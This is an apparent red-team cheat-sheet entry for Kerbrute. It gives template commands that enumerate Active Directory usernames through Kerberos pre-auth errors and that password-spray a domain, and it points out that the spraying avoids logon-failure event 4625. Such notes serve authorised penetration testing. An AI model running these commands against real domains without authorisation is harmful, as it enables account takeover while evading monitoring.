# Kerbrute
> Fast Kerberos pre-auth brute tool: enumerate valid usernames and password-spray AD without tripping NTLM logon-failure events (no 4625).

<!-- tags: ad,kerbrute,kerberos,pre-auth,spray,enum -->

---

## enumerate users kerberos
Validate which usernames exist by abusing Kerberos pre-auth error codes (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED). Filters out non-hits.

```bash
kerbrute userenum {{USERLIST:wordlist:users.txt}} -d {{DOMAIN:domain:corp.local}} --dc {{DC_IP:ip:10.10.10.1}} -v | grep -v "User does not exist"
```

<!-- meta: risk=low | phase=enum | tags=kerberos,userenum,pre-auth -->

---

## password spray kerberos
Spray a single password across a userlist via Kerberos pre-auth. No event 4625 on most targets since the auth never reaches NTLM.

```bash
kerbrute passwordspray {{USERLIST:wordlist:users.txt}} -d {{DOMAIN:domain:corp.local}} {{PASSWORD:str:Spring2025!}} --dc {{DC_IP:ip:10.10.10.1}} -v
```

<!-- meta: risk=med | phase=enum | tags=kerberos,spray,pre-auth -->
